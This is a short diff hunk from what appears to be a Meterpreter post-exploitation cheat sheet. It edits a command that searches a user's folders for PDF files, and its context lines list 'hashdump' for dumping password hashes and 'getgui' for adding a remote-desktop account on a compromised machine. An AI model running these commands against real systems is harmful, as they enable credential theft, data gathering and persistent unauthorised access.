@@ -215,7 +215,7 @@ screenshot                                    Take a photo of the desktop.
 
 hashdump                                      Dump password hashes.
 
-search -d c:\\documents\ and\ settings\\<user>\\desktop\\ -f *.pdf
+search -d c:\\documents\ and\ settings\\<user>\\ -f *.pdf
 
 run getgui -u hacker -p password
 
